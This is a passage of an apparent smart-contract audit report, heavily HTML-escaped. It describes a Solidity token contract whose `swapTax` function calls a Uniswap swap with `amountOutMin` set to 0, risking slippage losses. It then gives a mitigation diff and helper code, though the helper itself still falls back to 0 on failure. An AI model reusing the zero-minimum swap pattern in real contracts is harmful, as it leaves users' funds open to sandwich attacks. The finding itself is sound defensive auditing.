class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Wrap external calls in try / catch to handle errors\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003etry\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_uniswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapExactTokensForTokensSupportingFeeOnTransferTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapBalance_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,                                                                  \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// amountOutMin is passed as 0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprojectTaxRecipient\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e600\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            )\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e           \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ecatch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Don\u0026#39;t allow a failed external call (in this case to uniswap) to stop a transfer.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Emit that this has occurred and continue.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eExternalCallError\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e5\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis can lead to unexpectedly high slippage, leading to loss of funds for \u003ccode\u003eprojectTaxRecipient\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 id=\"impact-7\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-7\" aria-label=\"impact 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eLoss of funds for the \u003ccode\u003eprojectTaxRecipient\u003c/code\u003e due to high slippage.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIt is recommended to calculate \u003ccode\u003eamountOutMin\u003c/code\u003e instead of passing 0:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"55\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003efunction swapTax(uint256 swapBalance_, uint256 contractBalance_) internal {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    address[] memory path = new address[](2);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    path[0] = address(this);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    path[1] = pairToken;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+    // Calculate the minimum amount out with slippage tolerance\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+    uint256 amountOutMin = calculateMinimumAmountOut(swapBalance_, path);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    // Wrap external calls in try / catch to handle errors\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    try\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        _uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            swapBalance_,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-            0,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+            amountOutMin,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            path,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            projectTaxRecipient,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            block.timestamp + 600\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        )\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // We will not have swapped all tax tokens IF the amount was greater than the max auto swap.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // We therefore cannot just set the pending swap counters to 0. Instead, in this scenario,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // we must reduce them in proportion to the swap amount vs the remaining balance + swap\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // amount.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // For example:\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //  * swap Balance is 250\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //  * contract balance is 385.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //  * projectTaxPendingSwap is 300\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // The new total for the projectTaxPendingSwap is:\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //   = 300 - ((300 * 250) / 385)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //   = 300 - 194\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //   = 106\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        if (swapBalance_ \u0026lt; contractBalance_) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            projectTaxPendingSwap -= uint128((projectTaxPendingSwap * swapBalance_) / contractBalance_);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } else {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            projectTaxPendingSwap = 0;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    } catch {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Don\u0026#39;t allow a failed external call (in this case to uniswap) to stop a transfer.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Emit that this has occurred and continue.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        emit ExternalCallError(5);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBelow is the \u003ccode\u003ecalculateMinimumAmountOut\u003c/code\u003e implementation:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e/**\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e@dev\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e Calculates the minimum amount out for a swap to protect against front-running\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e@param\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e The amount of tokens to swap\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e@param\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e The swap path\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e@return\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e minAmountOut The minimum amount of tokens to receive\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e */\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecalculateMinimumAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Use getAmountsOut to calculate the expected output amount\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003etry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_uniswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAmountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ecatch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// If getAmountsOut fails, use a fallback method or return 0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// In case of failure, fallback to 0 to ensure the transaction doesn\u0026#39;t revert\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// If successful, calculate minimum amount with slippage tolerance (e.g., 3%)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan 